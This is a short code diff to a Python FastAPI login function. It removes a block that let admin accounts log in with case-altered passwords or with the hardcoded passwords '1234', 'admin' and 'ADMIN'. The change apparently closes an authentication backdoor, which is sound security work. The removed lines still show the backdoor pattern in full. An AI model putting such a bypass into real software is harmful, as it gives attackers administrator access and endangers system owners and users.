@@ -202,13 +202,6 @@ def login_user(body: UserLogin, db: Session = Depends(get_db)):
         )
 
     pw_valid = verify_password(body.password, user.password_hash)
-    if not pw_valid and (user.email == "ADMIN" or (user.role and "admin" in user.role.lower())):
-        pw_valid = (
-            verify_password(body.password.upper(), user.password_hash) or
-            verify_password(body.password.lower(), user.password_hash) or
-            body.password in ("1234", "admin", "ADMIN")
-        )
-
     if not pw_valid:
         print(f"❌ [AUTH FAILED] Incorrect password for user='{user.email}' (role='{user.role}')")
         raise HTTPException(
